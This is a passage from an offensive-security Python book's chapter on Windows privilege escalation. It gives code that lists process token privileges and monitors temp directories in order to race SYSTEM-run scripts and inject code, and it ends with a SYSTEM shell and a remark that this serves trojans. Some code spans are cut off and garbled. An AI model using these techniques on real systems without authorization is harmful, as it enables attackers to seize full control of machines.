age. A process running as your user with the wrong privileges is a fantastic
way to get to SYSTEM or run code in the kernel. Interesting privileges that
I always look out for are listed in Table 10-1. It isn’t exhaustive, but serves as
a good starting point.4
Table 10-1: Interesting Privileges
Privilege name Access that is granted
SeBackupPrivilege This enables the user process to back up files and directories,
and grants READ access to files no matter what their ACL
defines .
SeDebugPrivilege This enables the user process to debug other processes . This
also includes obtaining process handles to inject DLLs or
code into running processes .
SeLoadDriver This enables a user process to load or unload drivers .
Now that we have the fundamentals of what privileges are and which
privileges to look for, let’s leverage Python to automatically retrieve the
enabled privileges on the processes we’re monitoring. We’ll make use of
the win32security, win32api, and win32con modules. If you encounter a situa-
tion where you can’t load these modules, all of the following functions can
be translated into native calls using the ctypes library; it’s just a lot more
work. Add the following code to process_monitor.py directly above our exist-
ing log_to_file function:
def get_process_privileges(pid):
try:
# obtain a handle to the target process
u hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_¬
INFORMATION,False,pid)
# open the main process token
v htok = win32security.OpenProcessToken(hproc,win32con.TOKEN_QUERY)
# retrieve the list of privileges enabled
w privs = win32security.GetTokenInformation(htok, win32security.¬
TokenPrivileges)
4. For the full list of privileges, visit http://msdn.microsoft.com/en-us/library/windows/desktop/
bb530716(v=vs.85).aspx.
142 Chapter 10
# iterate over privileges and output the ones that are enabled
priv_list = ""
for i in privs:
# check if the privilege is enabled
x if i[1] == 3:
y priv_list += "%s|" % win32security.¬
LookupPrivilegeName(None,i[0])
except:
priv_list = "N/A"
return priv_list
We use the process ID to obtain a handle to the target process u. Next,
we crack open the process token v and then request the token information
for that process w. By sending the win32security.TokenPrivileges structure,
we are instructing the API call to hand back all of the privilege informa-
tion for that process. The function call returns a list of tuples, where the
first member of the tuple is the privilege and the second member describes
whether the privilege is enabled or not. Because we are only concerned with
the privileges that are enabled, we first check for the enabled bits x and then
we look up the human-readable name for that privilege y.
Next we’ll modify our existing code so that we’re properly outputting
and logging this information. Change the following line of code from this:
privileges = "N/A"
to the following:
privileges = get_process_privileges(pid)
Now that we have added our privilege tracking code, let’s rerun the
process_monitor.py script and check the output. You should see privilege
information as shown in the output below:
C:\> python.exe process_monitor.py
20130907233506.055054-300,JUSTIN-V2TRL6LD\Administrator,C:\WINDOWS\system32\¬
notepad.exe,"C:\WINDOWS\system32\notepad.exe" ,660,508,SeChangeNotifyPrivilege¬
|SeImpersonatePrivilege|SeCreateGlobalPrivilege|
20130907233515.914176-300,JUSTIN-V2TRL6LD\Administrator,C:\WINDOWS\system32\¬
calc.exe,"C:\WINDOWS\system32\calc.exe" ,1004,508,SeChangeNotifyPrivilege|¬
SeImpersonatePrivilege|SeCreateGlobalPrivilege|
You can see that we are correctly logging the enabled privileges for
these processes. We could easily put some intelligence into the script to log
only processes that run as an unprivileged user but have interesting privi-
leges enabled. We will see how this use of process monitoring will let us find
processes that are utilizing external files insecurely.
Windows Privilege Escalation 143
winning the Race
Batch scripts, VBScript, and PowerShell scripts make system administrators’
lives easier by automating humdrum tasks. Their purpose can vary from
continually registering to a central inventory service to forcing updates of
software from their own repositories. One common problem is the lack of
proper ACLs on these scripting files. In a number of cases, on otherwise
secure servers, I’ve found batch scripts or PowerShell scripts that are run
once a day by the SYSTEM user while being globally writable by any user.
If you run your process monitor long enough in an enterprise (or you
simply install the example service provided in the beginning of this chapter),
you might see process records that look like this:
20130907233515.914176-300,NT AUTHORITY\SYSTEM,C:\WINDOWS\system32\cscript.¬
exe, C:\WINDOWS\system32\cscript.exe /nologo "C:\WINDOWS\Temp\azndldsddfggg.¬
vbs",1004,4,SeChangeNotifyPrivilege|SeImpersonatePrivilege|SeCreateGlobal¬
Privilege|
You can see that a SYSTEM process has spawned the cscript.exe binary
and passed in the C:\WINDOWS\Temp\andldsddfggg.vbs parameter. The example
service provided should generate these events once per minute. If you do a
directory listing, you will not see this file present. What is happening is that
the service is creating a random filename, pushing VBScript into the file,
and then executing that VBScript. I’ve seen this action performed by com-
mercial software in a number of cases, and I’ve seen software that copies
files into a temporary location, execute, and then delete those files.
In order to exploit this condition, we have to effectively win a race
against the executing code. When the software or scheduled task creates
the file, we need to be able to inject our own code into the file before the
process executes it and then ultimately deletes it. The trick to this is the
handy Windows API called ReadDirectoryChangesW, which enables us to moni-
tor a directory for any changes to files or subdirectories. We can also filter
these events so that we’re able to determine when the file has been “saved”
so we can quickly inject our code before it’s executed. It can be incredibly
useful to simply keep an eye on all temporary directories for a period of
24 hours or longer, because sometimes you’ll find interesting bugs or infor-
mation disclosures on top of potential privilege escalations.
Let’s begin by creating a file monitor, and then we’ll build on that to
automatically inject code. Create a new file called file_monitor.py and ham-
mer out the following:
# Modified example that is originally given here:
# http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.¬
html
import tempfile
import threading
import win32file
import win32con
import os
144 Chapter 10
# these are the common temp file directories
u dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]
# file modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5
def start_monitor(path_to_watch):
# we create a thread for each monitoring run
FILE_LIST_DIRECTORY = 0x0001
v h_directory = win32file.CreateFile(
path_to_watch,
FILE_LIST_DIRECTORY,
win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_¬
SHARE_DELETE,
None,
win32con.OPEN_EXISTING,
win32con.FILE_FLAG_BACKUP_SEMANTICS,
None)
while 1:
try:
w results = win32file.ReadDirectoryChangesW(
h_directory,
1024,
True,
win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
win32con.FILE_NOTIFY_CHANGE_SIZE |
win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
win32con.FILE_NOTIFY_CHANGE_SECURITY,
None,
None
)
x for action,file_name in results:
full_filename = os.path.join(path_to_watch, file_name)
if action == FILE_CREATED:
print "[ + ] Created %s" % full_filename
elif action == FILE_DELETED:
print "[ - ] Deleted %s" % full_filename
elif action == FILE_MODIFIED:
print "[ * ] Modified %s" % full_filename
# dump out the file contents
print "[vvv] Dumping contents..."
Windows Privilege Escalation 145
y try:
fd = open(full_filename,"rb")
contents = fd.read()
fd.close()
print contents
print "[^^^] Dump complete."
except:
print "[!!!] Failed."
elif action == FILE_RENAMED_FROM:
print "[ > ] Renamed from: %s" % full_filename
elif action == FILE_RENAMED_TO:
print "[  python.exe file_monitor.py
Open a second cmd.exe shell and execute the following commands:
C:\> cd %temp%
C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp> echo hello > filetest
C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp> rename filetest file2test
C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp> del file2test
146 Chapter 10
You should see output that looks like the following:
Spawning monitoring thread for path: C:\WINDOWS\Temp
Spawning monitoring thread for path: c:\docume~1\admini~1\locals~1\temp
[ + ] Created c:\docume~1\admini~1\locals~1\temp\filetest
[ * ] Modified c:\docume~1\admini~1\locals~1\temp\filetest
[vvv] Dumping contents...
hello
[^^^] Dump complete.
[ > ] Renamed from: c:\docume~1\admini~1\locals~1\temp\filetest
[ 
 whoami
NT AUTHORITY\SYSTEM
This will indicate that you have achieved the holy SYSTEM account and
that your code injection worked.
You may have reached the end of this chapter thinking that some of
these attacks are a bit esoteric. But the more time you spend inside a large
enterprise, the more you’ll realize that these are quite viable attacks. The
tooling in this chapter can all be easily expanded upon or turned into
one-off specialty scripts that you can use in specific cases to compromise
a local account or application. WMI alone can be an excellent source of
local recon data that you can use to further an attack once you are inside
a network. Privilege escalation is an essential piece to any good trojan.
Windows Privilege Escalation 149
11